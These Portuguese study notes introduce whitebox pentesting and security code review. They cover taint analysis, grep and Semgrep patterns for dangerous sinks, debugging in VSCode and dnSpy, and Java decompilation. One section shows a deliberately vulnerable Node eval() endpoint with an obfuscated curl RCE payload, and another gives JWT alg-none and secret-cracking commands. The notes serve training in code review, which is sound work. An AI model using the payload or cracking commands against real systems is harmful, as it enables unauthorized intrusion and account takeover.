---
title: "Whitebox Pentesting — Intro"
---

# Introdução ao Whitebox Pentesting

## Contexto: Revisão de Código de Segurança — Encontrando Falhas na Fonte

Whitebox pentesting — também chamado de Security Code Review — é a análise de segurança mais profunda que existe. Em contraste com blackbox (sem acesso ao código), whitebox parte do código-fonte e trabalha para trás: encontrar onde vulnerabilidades existem antes de precisar explorá-las.

**O que é Security Code Review:**

De acordo com o material de "Introdução a revisão de segurança de código", Security Code Review é fundamentalmente diferente do Code Review tradicional de QA. Enquanto QA valida se o código *funciona* (o CPF tem 11 dígitos? O formulário submete corretamente?), Security Code Review valida se o código pode ser *burlado* — se alguma entrada maliciosa consegue fazer o sistema se comportar de maneira não esperada.

Os três pilares básicos do Security Code Review:
1. **Seguir o input do usuário**: rastrear cada entrada do usuário até onde ela é processada — o que hoje chamamos de *taint analysis*. Grande parte das vulnerabilidades existe porque input não tratado corretamente chega a um sink perigoso (query SQL, chamada de sistema, template engine)
2. **Segredos expostos no código**: chaves, credenciais e tokens hardcoded que qualquer pessoa com acesso ao repositório pode usar — ou que ficam expostos se o repositório se tornar público
3. **Funções perigosas**: `eval()`, `exec()`, `system()` — funções que, combinadas com input do usuário sem sanitização, criam vetores de RCE

**SAST vs code review manual — o que cada um encontra:**

Ferramentas de SAST (Semgrep, SonarQube, SonarCloud) fazem análise estática automatizada — identificam padrões de código conhecidamente vulneráveis. SAST e code review manual são *complementares*, não substitutos:

- SAST encontra: vulnerabilidades conhecidas, dependências desatualizadas, uso de funções perigosas, secrets hardcoded com padrões reconhecíveis
- SAST não encontra: vulnerabilidades de lógica de negócio, race conditions, type juggling contextual, falsos positivos que o contexto resolve (a dependência vulnerável que não está sendo usada de forma exploitável)
- Code review manual encontra: o que ferramentas não conseguem inferir sem entender o fluxo de negócio

Um exemplo concreto: um scanner pode apontar que a dependência `pickle` está sendo usada. Mas só o code review manual determina se essa dependência está sendo usada em um contexto onde o usuário controla o input (exploitável) ou em um contexto interno onde não há controle externo (falso positivo).

**OWASP ASVS como checklist de revisão:**

O OWASP Application Security Verification Standard (ASVS) é um framework de requisitos de segurança para aplicações web. O OWASP ASVS pode ser usado como *checklist* de código: para cada categoria (autenticação, autorização, validação de input, criptografia), existe uma lista de controles que o código deve implementar. Code review usando ASVS como guia garante cobertura sistemática em vez de revisão ad hoc.

**Conectar com dependências inseguras (supply chain):**

Dependências em versão vulnerável podem comprometer completamente a aplicação — um cenário crítico: dependências em versão vulnerável podem comprometer completamente a aplicação. Mas o ponto importante é que a existência da dependência não é suficiente para declarar vulnerabilidade — é necessário analisar *como* a dependência é usada. Uma biblioteca com CVE de deserialização insegura só é explorável se o input do usuário chega ao código de deserialização.

**Whitebox Pentesting oferece:**

- **Cobertura total**: todo caminho de código pode ser analisado
- **Vulnerabilidades invisíveis no blackbox**: race conditions, prototype pollution, type juggling
- **Menor tempo de descoberta**: código revela a lógica, não é necessário adivinhar
- **Melhor relatório**: pode citar linha exata do código vulnerável

Em ambientes corporativos, whitebox é contratado como "secure code review" e tem valor enorme para identificar bugs antes de ir a produção. Em Bug Bounty, alguns programas oferecem acesso ao código-fonte (principalmente open source).

---

## Metodologia de Quatro Etapas: Review, Teste, PoC e Remediação

### Metodologia Whitebox (4 Etapas)

| Etapa | Nome | O Que Fazer |
|---|---|---|
| 1 | Code Review | Navegação estática + dinâmica para identificar funções vulneráveis |
| 2 | Local Testing | Configurar ambiente de teste local, debugging com breakpoints |
| 3 | Proof of Concept | Explorar a vulnerabilidade identificada localmente, confirmar impacto |
| 4 | Patching & Remediation | Propor e implementar correção, re-testar |

### Análise Estática vs Dinâmica

| Tipo | Descrição | Ferramentas |
|---|---|---|
| **Estática** | Leitura de código sem executar | VSCode, grep, Semgrep, SonarQube |
| **Dinâmica** | Executa o código e observa comportamento | Debugger, breakpoints, logs |
| **Híbrida** | Ambas combinadas | VSCode + debugger (MELHOR ABORDAGEM) |

---

## Na Prática

### 1. Configuração do Ambiente com Docker

```bash
# Stack MERN (Mongo, Express, React, Node) - comum em módulo HTB
# Construir imagem Docker do projeto
# No VSCode: abrir Dockerfile, clicar botão direito -> Build Image

# Ou via linha de comando
docker build -t validation_logic_disparity .
docker run -p 5000:5000 validation_logic_disparity

# Acessar aplicação
# http://localhost:5000

# Abrir shell no container
docker exec -it CONTAINER_ID /bin/bash

# Acessar MongoDB no container
docker exec -it CONTAINER_ID mongosh
```

### 2. Debugging com VSCode (Node.js)

```bash
# Configurar debugging: Run and Debug -> Docker: Attach to Node
# Isso atualiza o arquivo .vscode/launch.json automaticamente

# launch.json para Node.js
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Docker: Attach to Node",
      "type": "node",
      "request": "attach",
      "remoteRoot": "/app",
      "localRoot": "${workspaceFolder}",
      "protocol": "inspector",
      "port": 9229,
      "restart": true,
      "address": "localhost"
    }
  ]
}
```

```bash
# Comandos de debugging:
# F5        - Continuar execucao (ate proximo breakpoint)
# F10       - Step Over (proxima linha, nao entra em funcao)
# F11       - Step Into (entra na funcao)
# SHIFT+F11 - Step Out (sai da funcao atual)
# SHIFT+F9  - Adicionar breakpoint na linha atual

# Watch variables - clicar direito na variavel -> "Add to Watch"
# Set Value - clicar direito no Watch -> "Set Value" (modificar valor em runtime!)
```

### 3. Estrutura de Projeto Node.js/Express

```
projeto/
|-- src/
|   |-- app.js              <- Ponto de entrada, rotas configuradas aqui
|   |-- controllers/        <- Logica de negocio (FOCO PRINCIPAL)
|   |   |-- auth-controllers.js
|   |   |-- users-controllers.js
|   |   +-- payment-controllers.js
|   |-- routes/             <- Mapeamento URL -> funcao controller
|   |   |-- auth-routes.js
|   |   +-- users-routes.js
|   +-- models/             <- Schema do banco de dados
|       |-- user.js
|       +-- payment.js
|-- db/                     <- Scripts de seed do banco
|-- config/                 <- Configuracoes
+-- Dockerfile
```

```javascript
// app.js - como localizar funcoes de interesse
// CTRL+Click em qualquer funcao/variavel para navegar ao source

const app = express();
app.use('/api/auth', authRoutes);    // -> src/routes/auth-routes.js
app.use('/api/users', userRoutes);   // -> src/routes/users-routes.js
app.use('/api/payment', paymentRoutes);

// routes/users-routes.js
router.post('/register', createUser);   // -> controllers/users-controllers.js
router.post('/login', login);
router.post('/update', updateUserDetails);
```

### 4. Taint Analysis — Seguindo o Input do Usuário

O conceito central da taint analysis: rastrear o fluxo do input do usuário desde onde ele entra (source) até onde é usado (sink). Vulnerabilidades surgem quando o dado percorre esse caminho sem sanitização ou validação adequada.

```bash
# Buscar com regex no VSCode (CTRL+SHIFT+F -> Use Regular Expression)

# Sources: onde input do usuario entra
(req\.body)+|(req\.params)+|(req\.query)+

# Sinks perigosos: onde input pode causar dano
grep -rn "eval(" src/
grep -rn "exec(" src/
grep -rn "system(" src/
grep -rn "db.query(" src/
grep -rn "findOne({" src/controllers/

# Comparacoes fracas (type juggling em PHP)
grep -rn " == " src/ --include="*.php" | grep -v "==="

# funcoes de execucao de comandos em JavaScript
grep -rn "new Function(" src/

# Parametros opcionais sem validacao null
grep -rn "let [a-zA-Z]*;" src/src/controllers/
```

### 5. Análise de Fluxo de Dados

```javascript
// Rastrear como dado do usuario percorre o codigo
// 1. Onde entra (req.body, req.params, req.query)
// 2. Como e processado (validacao, transformacao)
// 3. Onde e usado (SQL, sistema de arquivos, etc)

// Exemplo de analise em processPayment()
export async function processPayment(req, res, next) {
    const { cardId, items } = req.body;    // <- ENTRADA do usuario
    const userId = req.user?.id;           // <- Extraido do JWT (mais seguro)
    
    // Validacao de cardId? -> Sim, verifica no banco
    const card = await PaymentCard.findOne({ userId, _id: cardId });
    
    // Validacao de items? -> AUSENTE! Vulneravel!
    // items pode ser: number, string, array de arrays, null
    for (const item of items) {            // <- Uso sem validacao de tipo
        // ...
    }
}
// Conclusao: items aceita qualquer tipo -> bug de input inesperado
```

### 6. npm audit e Análise de Dependências

```bash
# Verificar vulnerabilidades conhecidas em dependencias
npm audit

# Resultado exemplo:
# node.extend  1.1.6  (prototype pollution CVE-2018-16491)
# lodash       4.17.x (prototype pollution em merge, cloneDeep)

# Atualizar pacotes vulneraveis
npm audit fix
npm audit fix --force  # pode causar breaking changes

# Analise manual de dependencias criticas
cat package.json | grep -E '"dependencies"|"devDependencies"' -A 50

# Verificar versoes especificas
npm list lodash node.extend
```

### 7. Injeção via eval() em Node.js

```javascript
// Codigo vulneravel (eval com input do usuario)
app.post('/api/text', (req, res) => {
    const { text } = req.body;
    
    function validateString(s) {
        // Filtra: aspas simples, aspas duplas, backtick, ponto-e-virgula
        // MAS NAO FILTRA: sinal de mais (+)
        const forbidden = ["'", '"', '`', ';'];
        for (let char of forbidden) {
            if (s.includes(char)) return false;
        }
        return true;
    }
    
    if (validateString(text)) {
        eval(`"${text}"`);  // VULNERAVEL!
        res.json({ text });
    }
});
```

```bash
# Exploracao: + nao e filtrado, permite concatenacao de strings
# Payload usa + para encadear expressoes JS em vez de ponto-e-virgula:
curl -X POST http://TARGET:PORT/api/text \
     -H "Content-Type: application/json" \
     -d '{"text": "test\"+process.mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync(String.fromCharCode(105,100)).toString()+\""}'
```

### 8. Inspeção de JWT

```bash
# Decodificar JWT (sem verificar assinatura)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEyMyIsInJvbGUiOiJ1c2VyIn0.xxx"
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null
# {"id":"123","role":"user"}

# Com jwt_tool
python3 jwt_tool.py TOKEN

# Verificar algoritmo (alg: none attack)
python3 jwt_tool.py TOKEN -X a

# Brute force da chave secreta
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# hashcat para brute force de JWT HS256
hashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt
```

---

## Ferramentas

| Ferramenta | Uso | Instalação |
|---|---|---|
| **VSCode** | IDE principal + debugging | Baixar em code.visualstudio.com |
| **PHP Debug** | Debug PHP no VSCode | Extensão: xdebug.php-debug |
| **Docker for VSCode** | Gerenciar containers | Extensão: ms-azuretools.vscode-docker |
| **RapidAPI** | Testar APIs direto no VSCode | Extensão: RapidAPI.vscode-rapidapi-client |
| **Semgrep** | Análise estática automatizada | `pip3 install semgrep` |
| **jwt_tool** | Análise e ataque de JWT | `git clone https://github.com/ticarpi/jwt_tool` |
| **npm audit** | Vulnerabilidades em deps Node.js | Nativo no npm |

```bash
# Semgrep - busca de padroes vulneraveis
semgrep --config=auto .                 # Auto-detectar linguagem
semgrep --config=p/javascript .         # Regras JS
semgrep --config=p/nodejs .             # Regras Node.js especificas
semgrep --config=p/owasp-top-ten .     # Top 10 OWASP
```

---

## Detecção

### Padrões de Código Vulnerável (Quick Reference)

| Padrão | Linguagem | Vulnerabilidade |
|---|---|---|
| `eval(input)` | JS/PHP | Execucao arbitraria de codigo |
| `$_GET['x']` sem sanitização | PHP | Multiplas injecs |
| `== 0` com hash | PHP | Type juggling / magic hash |
| `merge(obj, userInput)` | JS | Prototype pollution |
| `let var;` sem valor inicial | JS | Null safety bug |
| `if (token)` para auth | JS | Bypass de auth com null |
| `for (item of items)` sem isArray | JS | Unexpected input |
| `token && token !== hash` | JS | Null bypass de verificacao |

### Checklist de Code Review

```
ESTRUTURA:
[ ] Ler README e entender arquitetura
[ ] Identificar todas as rotas e seus controllers
[ ] Mapear autenticacao (onde e verificada?)
[ ] Identificar onde dados do usuario entram

ENTRADA DE DADOS (Taint Analysis):
[ ] Todos os req.body, req.params, req.query estao validados?
[ ] Validacao e feita no backend (nao apenas frontend)?
[ ] Tipos de variaveis sao verificados estritamente?
[ ] Valores null/undefined sao tratados?

BANCO DE DADOS:
[ ] Queries usam ORM parametrizado ou raw SQL?
[ ] IDs de banco sao expostos ao usuario?
[ ] Dados sao filtrados por userId (IDOR)?

AUTENTICACAO:
[ ] JWT tem expiracao?
[ ] Chave JWT esta em variavel de ambiente?
[ ] Comparacoes de token sao estritas (===)?
[ ] "Default to fail" ou "default to success"?

DEPENDENCIAS (Supply Chain):
[ ] npm audit sem vulnerabilidades criticas?
[ ] Versoes de pacotes fixas no package.json?
[ ] Dependencias vulneraveis estao sendo usadas de forma exploitavel?

SEGREDOS:
[ ] API keys, tokens e credenciais em variaveis de ambiente (nao hardcoded)?
[ ] .env nao commitado no repositorio?
[ ] Logs nao imprimem dados sensiveis?

OWASP ASVS (Checklist de verificacao):
[ ] V1: Arquitetura — controles de segurança no backend, não só no frontend
[ ] V2: Autenticação — tokens com expiração, comparações estritas
[ ] V3: Gerenciamento de sessão — invalidação adequada de sessões
[ ] V4: Controle de acesso — verificação em cada endpoint, não só na UI
[ ] V5: Validação de input — whitelist de tipos e valores esperados
[ ] V6: Criptografia — algoritmos atuais, chaves em variáveis de ambiente
```

---

## Análise de Aplicações Java (WAR/JAR/EAR)

### Estrutura Típica de WAR

```
app.war
├── WEB-INF/
│   ├── classes/       ← bytecode Java (.class)
│   ├── lib/           ← dependências (.jar)
│   └── web.xml        ← mapeamento de servlets e filtros
├── *.jsp              ← páginas executáveis (atenção: input reflectido)
└── assets/            ← JS/CSS/imagens
```

### Ferramentas — Extração e Decompilação

```bash
# listar conteúdo sem extrair
jar -tf app.war

# extrair em diretório
jar -xf app.war

# descompilar classe específica com CFR
java -jar cfr.jar WEB-INF/classes/com/app/controllers/UserController.class

# JD-GUI — abre WAR/JAR diretamente com interface gráfica
# File → Open File → selecionar .war
# Navegar por pacotes, ver código descompilado, salvar fonte
```

Alternativas de decompiladores: Procyon, Fernflower (IntelliJ built-in).

### Padrões Críticos para Buscar

```bash
# após extrair o WAR
cd WEB-INF/classes

# execução de processo — RCE direto
grep -rn "ProcessBuilder\|Runtime.exec\|Runtime.getRuntime" .

# PRNG não seguro — token prediction
grep -rn "new Random(" .   # deve ser "new SecureRandom(" para ser seguro

# deserialização Java — gadget chains
grep -rn "ObjectInputStream\|readObject\|XMLDecoder" .

# input do usuário — sources para rastrear até sinks
grep -rn "getParameter\|getHeader\|getQueryString\|getPathInfo" .

# SQL concatenado — SQLi
grep -rn "\"SELECT\|\"INSERT\|\"UPDATE\|createStatement" .
```

### Estratégia Top-Down para Aplicações Grandes

```
1. start.sh / run.sh → identificar MAIN_CLASS e args
2. MAIN_CLASS → encontrar DatabaseMigration → ver schema + credenciais default
3. web.xml → mapeamento servlet → identificar controllers
4. Controller → chama ServiceInterface → grep "implements NomeInterface"
5. ServiceImpl → implementação real → lógica de negócio e validações
6. Rastrear input desde getParameter() até sink (SQL, OS, deserialização)
```

### Dica: Migration Scripts

Sempre inspecionar scripts de migração de banco (`db/migrations/`, `flyway/`, `liquibase/`):
- Contêm schema completo → entender estrutura de dados
- Frequentemente têm credenciais hardcoded ou usuários padrão
- Revelam stored procedures e triggers

```bash
find . -name "*.sql" -o -name "*.xml" | xargs grep -l "password\|credential\|secret"
```

---

## dnSpy — Debug .NET em Tempo Real

dnSpy é um decompilador e debugger para aplicações .NET (C#/VB.NET) que permite definir breakpoints no código descompilado e inspecionar estado em runtime.

### Fluxo Básico

```
1. File → Open → selecionar DLL ou EXE
2. Assembly Explorer (painel esquerdo) → expandir namespace → abrir classe
3. Clicar na linha → F9 para definir breakpoint (margem fica vermelha)
4. Debug → Start Debugging (app local) OU
   Debug → Attach to Process → selecionar processo .NET em execução
```

### Janelas de Debug

| Janela | Uso |
|--------|-----|
| Locals | Variáveis locais do frame atual com valores |
| Watch | Expressões customizadas avaliadas em tempo real |
| Call Stack | Pilha de chamadas — rastrear origem da execução |
| Immediate | Avaliar expressões C# no contexto do breakpoint |

**Teclas essenciais:**
- `F9` — toggle breakpoint
- `F5` — continuar execução
- `F10` — step over (próxima linha, sem entrar na função)
- `F11` — step into (entrar dentro da função chamada)

### Casos de Uso no Pentest

```
Verificar lógica de deserialização XmlSerializer:
  → breakpoint no método de processamento do cookie/parâmetro
  → inspecionar o valor exato sendo deserializado
  → confirmar se payload é aceito antes de disparar callback

Confirmar branch executado para payload específico:
  → caso DNNPersonalization cookie (AWAE .NET deserialization)
  → step-through para ver qual ramo do if/switch é tomado
  → ajustar payload até chegar no ObjectDataProvider

Inspecionar valores de variáveis intermediárias:
  → Watch: adicionar expressão "variable.Property.NestedProp"
  → verificar transformações (encode/decode, merge de objetos)
```

### Setup

```bash
# Download
# https://github.com/dnSpy/dnSpy/releases
# Versão Windows standalone (não requer instalação)

# Para debug remoto (app em servidor Windows):
# Debug → Options → Remote Debugging → configurar porta
# No servidor: instalar dnSpy server component
```
